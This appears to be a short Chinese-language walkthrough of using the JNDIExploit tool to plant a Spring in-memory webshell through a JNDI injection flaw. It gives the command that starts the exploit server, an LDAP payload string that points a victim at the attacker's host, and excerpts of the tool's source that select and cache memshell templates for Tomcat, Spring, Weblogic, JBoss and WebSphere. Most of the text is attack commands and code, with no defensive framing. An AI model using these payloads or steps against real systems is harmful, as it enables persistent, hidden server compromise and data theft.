在存在jdni注入的情况下，注入一个Spring的内存马。
开启jdni注入工具：
```
java -jar JNDIExploit-1.2-SNAPSHOT.jar --ip 192.168.17.129 --httpPort 8081
```

请求中插入payload：
```
ldap://192.168.17.129:1389/TomcatBypass/SpringMemshell
```

jndi注入工具收到请求：
![image](https://user-images.githubusercontent.com/30398606/174015267-93d53012-99f1-4bbf-9785-e1779d549928.png)


相关注入代码：
com.feihong.ldap.gadgets.utils.Gadgets #createTemplatesImpl (PayloadType type, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory, String... param)
  
```java
  byte[] classBytes = null;
        switch (type){
            ...
            case springmemshell:
                classBytes = Cache.get("SpringMemshellTemplate");
                break;
            ...
         }
```

com.feihong.ldap.utils.Cache中注入：
```
      static{
        try {
            //过期时间100年，永不过期的简单方法
            map.put("TomcatEchoTemplate", Util.getClassBytes(TomcatEchoTemplate.class), 365 * 100, TimeUnit.DAYS);
            map.put("SpringEchoTemplate", Util.getClassBytes(SpringEchoTemplate.class), 365 * 100, TimeUnit.DAYS);
            map.put("WeblogicEchoTemplate", Util.getClassBytes(WeblogicEchoTemplate.class), 365 * 100, TimeUnit.DAYS);
            map.put("TomcatMemshellTemplate1", Util.getClassBytes(TomcatMemshellTemplate1.class), 365 * 100, TimeUnit.DAYS);
            map.put("TomcatMemshellTemplate2", Util.getClassBytes(TomcatMemshellTemplate2.class), 365 * 100, TimeUnit.DAYS);
            map.put("JettyMemshellTemplate", Util.getClassBytes(JettyMemshellTemplate.class), 365 * 100, TimeUnit.DAYS);
            map.put("WeblogicMemshellTemplate1", Util.getClassBytes(WeblogicMemshellTemplate1.class), 365 * 100, TimeUnit.DAYS);
            map.put("WeblogicMemshellTemplate2", Util.getClassBytes(WeblogicMemshellTemplate2.class), 365 * 100, TimeUnit.DAYS);
            map.put("JBossMemshellTemplate", Util.getClassBytes(JBossMemshellTemplate.class), 365 * 100, TimeUnit.DAYS);
            map.put("WebsphereMemshellTemplate", Util.getClassBytes(WebsphereMemshellTemplate.class), 365 * 100, TimeUnit.DAYS);
            map.put("SpringMemshellTemplate", Util.getClassBytes(SpringMemshellTemplate.class), 365 * 100, TimeUnit.DAYS);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static byte[] get(String key){
        return map.get(key);
    }

    public static void set(String key, byte[] bytes){
        map.put(key, bytes);
    }
```

```java
// TomcatBypassHelper

        public String injectSpringMemshell(){
            return injectMemshell(SpringMemshellTemplate.class);
        }
```


Ref:
- https://github.com/shadowsock5/JNDIExploit/blob/a3addc8d5fb3281d9ea95f9fbcc85e14ebb8dd25/src/main/java/com/feihong/ldap/controllers/TomcatBypassController.java
